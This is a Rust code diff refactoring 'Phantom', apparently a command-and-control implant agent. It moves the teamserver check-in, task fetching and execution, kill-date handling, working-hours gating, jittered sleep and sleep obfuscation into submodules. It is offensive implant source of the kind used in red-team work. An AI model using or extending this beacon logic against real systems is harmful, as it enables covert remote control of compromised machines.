@@ -1,46 +1,42 @@
-//! Core Phantom agent loop and task dispatch.
+//! Core Phantom agent state, construction, and host metadata collection.
+
+mod job_queue;
+mod run_loop;
+mod transport;
 
 use std::fs;
 use std::path::PathBuf;
-use std::time::Duration;
 
 use red_cell_common::crypto::{
     AgentCryptoMaterial, derive_session_keys, derive_session_keys_for_version,
     generate_agent_crypto_material,
 };
-use red_cell_common::demon::{DemonCommand, DemonPackage};
-use time::{OffsetDateTime, Time};
-use tracing::{info, warn};
 
-use crate::command::{PendingCallback, PhantomState, execute};
+use crate::command::PhantomState;
 use crate::config::PhantomConfig;
 use crate::error::PhantomError;
-use crate::protocol::{
-    AgentMetadata, build_callback_packet, build_init_packet, callback_ctr_blocks, parse_init_ack,
-    parse_job_response,
-};
-use crate::sleep_obfuscate::blocking_sleep;
+use crate::protocol::AgentMetadata;
 use crate::transport::HttpTransport;
 
 /// Running Phantom session state.
 #[derive(Debug)]
 pub struct PhantomAgent {
-    agent_id: u32,
-    raw_crypto: AgentCryptoMaterial,
-    session_crypto: AgentCryptoMaterial,
-    config: PhantomConfig,
-    transport: HttpTransport,
+    pub(super) agent_id: u32,
+    pub(super) raw_crypto: AgentCryptoMaterial,
+    pub(super) session_crypto: AgentCryptoMaterial,
+    pub(super) config: PhantomConfig,
+    pub(super) transport: HttpTransport,
     /// Shared monotonic CTR block offset, mirroring the server's single offset.
     ///
     /// Both encrypt (send) and decrypt (recv) operations use and advance this
     /// single counter, matching the teamserver's `AgentEntry::ctr_block_offset`.
-    ctr_offset: u64,
+    pub(super) ctr_offset: u64,
     /// Monotonic sequence counter for server-side replay protection.
     ///
     /// Prepended as 8 LE bytes to every callback payload before encryption.
     /// Starts at 1; the teamserver rejects any callback with seq ≤ last_seen_seq.
-    callback_seq: u64,
-    state: PhantomState,
+    pub(super) callback_seq: u64,
+    pub(super) state: PhantomState,
 }
 
 impl PhantomAgent {
@@ -136,242 +132,6 @@ impl PhantomAgent {
             working_hours: self.config.working_hours.unwrap_or(0),
         }
     }
-
-    /// Perform the initial registration handshake.
-    pub async fn init_handshake(&mut self) -> Result<(), PhantomError> {
-        let metadata = self.collect_metadata();
-        let packet = build_init_packet(
-            self.agent_id,
-            &self.raw_crypto,
-            &metadata,
-            self.config.init_secret_version,
-        )?;
-        let response = self.transport.send(&packet).await?;
-        self.ctr_offset = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
-        Ok(())
-    }
-
-    /// Send a `COMMAND_CHECKIN` heartbeat, then fetch and dispatch queued tasks
-    /// with a separate `COMMAND_GET_JOB` request.
-    ///
-    /// Mirrors Specter's two-request pattern: the teamserver's `handle_checkin`
-    /// returns no task bytes (always `Ok(None)`), so tasks must be fetched via
-    /// a follow-up `CommandGetJob` call.
-    pub async fn checkin(&mut self) -> Result<bool, PhantomError> {
-        self.state.poll().await?;
-        self.flush_pending_callbacks().await?;
-
-        // Send COMMAND_CHECKIN heartbeat; the server always returns an empty body.
-        let packet = build_callback_packet(
-            self.agent_id,
-            &self.session_crypto,
-            self.ctr_offset,
-            self.callback_seq,
-            u32::from(DemonCommand::CommandCheckin),
-            0,
-            &[],
-        )?;
-        let _response = self.transport.send(&packet).await?;
-        self.ctr_offset += callback_ctr_blocks(0);
-        self.callback_seq += 1;
-
-        // Fetch queued tasks with a separate COMMAND_GET_JOB request.
-        let packages = self.get_job().await?;
-
-        let mut exit_requested = false;
-        for package in packages {
-            execute(&package, &mut self.config, &mut self.state).await?;
-            for callback in self.state.drain_callbacks() {
-                let payload = callback.payload()?;
-                let packet = build_callback_packet(
-                    self.agent_id,
-                    &self.session_crypto,
-                    self.ctr_offset,
-                    self.callback_seq,
-                    callback.command_id(),
-                    callback.request_id(),
-                    &payload,
-                )?;
-                self.send_packet(packet).await?;
-                self.ctr_offset += callback_ctr_blocks(payload.len());
-                self.callback_seq += 1;
-                if matches!(callback, PendingCallback::Exit { .. }) {
-                    exit_requested = true;
-                }
-            }
-        }
-
-        Ok(exit_requested)
-    }
-
-    /// Send a `COMMAND_GET_JOB` and return the decrypted task packages.
-    ///
-    /// The teamserver responds with a raw [`DemonMessage`] byte stream where
-    /// each package payload is individually encrypted at successive monotonic
-    /// CTR offsets — no outer envelope.
-    pub async fn get_job(&mut self) -> Result<Vec<DemonPackage>, PhantomError> {
-        let packet = build_callback_packet(
-            self.agent_id,
-            &self.session_crypto,
-            self.ctr_offset,
-            self.callback_seq,
-            u32::from(DemonCommand::CommandGetJob),
-            0,
-            &[],
-        )?;
-
-        let response = self.transport.send(&packet).await?;
-        self.ctr_offset += callback_ctr_blocks(0);
-        self.callback_seq += 1;
-
-        let (packages, next_offset) =
-            parse_job_response(&self.session_crypto, self.ctr_offset, &response)?;
-        self.ctr_offset = next_offset;
-
-        Ok(packages)
-    }
-
-    /// Run the main callback loop until exit conditions are met.
-    pub async fn run(&mut self) -> Result<(), PhantomError> {
-        self.init_handshake().await?;
-        info!(agent_id = format_args!("0x{:08X}", self.agent_id), "phantom initialized");
-
-        loop {
-            if self.kill_date_elapsed() {
-                warn!("phantom kill date reached; exiting");
-                self.send_kill_date_callback().await?;
-                break;
-            }
-
-            let delay = Duration::from_millis(self.compute_sleep_delay());
-            let mode = self.config.sleep_mode;
-            // `spawn_blocking` offloads the mprotect+nanosleep cycle to a
-            // dedicated OS thread so the Tokio executor remains schedulable.
-            // It works on both multi-thread and current-thread runtimes.
-            let _ = tokio::task::spawn_blocking(move || blocking_sleep(delay, mode)).await;
-            if self.checkin().await? {
-                break;
-            }
-        }
-
-        Ok(())
-    }
-
-    fn compute_sleep_delay(&self) -> u64 {
-        let base = u64::from(self.config.sleep_delay_ms);
-        let now = current_local_time();
-        let working_hours = self.state.working_hours().or(self.config.working_hours);
-        if let Some(working_hours) = working_hours
-            && !is_within_working_hours_at(working_hours, now)
-            && base > 0
-        {
-            return sleep_until_working_hours(working_hours, now);
-        }
-
-        if self.config.sleep_jitter == 0 || base == 0 {
-            return base;
-        }
-
-        let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
-        let spread = jitter_range.saturating_mul(2);
-        let jitter = rand::random::<u64>() % (spread.saturating_add(1));
-        base.saturating_sub(jitter_range).saturating_add(jitter)
-    }
-
-    fn kill_date_elapsed(&self) -> bool {
-        let kill_date = self.state.kill_date().or(self.config.kill_date).filter(|&kd| kd > 0);
-        match kill_date {
-            Some(kill_date) => {
-                let now = std::time::SystemTime::now()
-                    .duration_since(std::time::UNIX_EPOCH)
-                    .map(|duration| i64::try_from(duration.as_secs()).unwrap_or(i64::MAX))
-                    .unwrap_or_default();
-                now >= kill_date
-            }
-            None => false,
-        }
-    }
-
-    /// Send a `CommandKillDate` callback to the teamserver to notify it that
-    /// the kill date has been reached, then flush any remaining callbacks.
-    async fn send_kill_date_callback(&mut self) -> Result<(), PhantomError> {
-        self.state.queue_kill_date_callback();
-        self.flush_pending_callbacks().await
-    }
-
-    async fn send_packet(&self, packet: Vec<u8>) -> Result<(), PhantomError> {
-        let _response = self.transport.send(&packet).await?;
-        Ok(())
-    }
-
-    async fn flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
-        for callback in self.state.drain_callbacks() {
-            let payload = callback.payload()?;
-            let packet = build_callback_packet(
-                self.agent_id,
-                &self.session_crypto,
-                self.ctr_offset,
-                self.callback_seq,
-                callback.command_id(),
-                callback.request_id(),
-                &payload,
-            )?;
-            self.send_packet(packet).await?;
-            self.ctr_offset += callback_ctr_blocks(payload.len());
-            self.callback_seq += 1;
-        }
-
-        Ok(())
-    }
-}
-
-fn current_local_time() -> OffsetDateTime {
-    OffsetDateTime::now_local().unwrap_or_else(|_| OffsetDateTime::now_utc())
-}
-
-fn is_within_working_hours_at(working_hours: i32, now: OffsetDateTime) -> bool {
-    let working_hours = working_hours as u32;
-    if (working_hours >> 22) & 1 == 0 {
-        return true;
-    }
-
-    let start = unpack_working_hours_time(working_hours, 17, 11);
-    let end = unpack_working_hours_time(working_hours, 6, 0);
-    let current = now.time();
-
-    if current.hour() < start.hour() || current.hour() > end.hour() {
-        return false;
-    }
-    if current.hour() == start.hour() && current.minute() < start.minute() {
-        return false;
-    }
-    if current.hour() == end.hour() && current.minute() > end.minute() {
-        return false;
-    }
-
-    true
-}
-
-fn sleep_until_working_hours(working_hours: i32, now: OffsetDateTime) -> u64 {
-    let working_hours = working_hours as u32;
-    let start = unpack_working_hours_time(working_hours, 17, 11);
-    let end = unpack_working_hours_time(working_hours, 6, 0);
-    let current_minutes = u64::from(now.hour()) * 60 + u64::from(now.minute());
-    let start_minutes = u64::from(start.hour()) * 60 + u64::from(start.minute());
-    let end_minutes = u64::from(end.hour()) * 60 + u64::from(end.minute());
-
-    let minutes_until_start = if current_minutes > end_minutes {
-        ((24 * 60) - current_minutes) + start_minutes
-    } else {
-        start_minutes.saturating_sub(current_minutes)
-    };
-    minutes_until_start.saturating_mul(60_000)
-}
-
-fn unpack_working_hours_time(working_hours: u32, hour_shift: u32, minute_shift: u32) -> Time {
-    let hour = ((working_hours >> hour_shift) & 0b01_1111) as u8;
-    let minute = ((working_hours >> minute_shift) & 0b11_1111) as u8;
-    Time::from_hms(hour.min(23), minute.min(59), 0).unwrap_or(Time::MIDNIGHT)
 }
 
 /// Return the NIS/YP domain name from the kernel, or `"WORKGROUP"` as fallback.
@@ -498,9 +258,10 @@ mod tests {
     };
     use red_cell_common::demon::{DemonCommand, DemonEnvelope, DemonMessage, DemonPackage};
 
-    use super::callback_ctr_blocks;
-    use super::{PhantomAgent, is_within_working_hours_at, sleep_until_working_hours};
+    use super::PhantomAgent;
+    use super::run_loop::{is_within_working_hours_at, sleep_until_working_hours};
     use crate::config::PhantomConfig;
+    use crate::protocol::callback_ctr_blocks;
 
     #[test]
     fn agent_creation_succeeds() -> Result<(), Box<dyn Error>> {
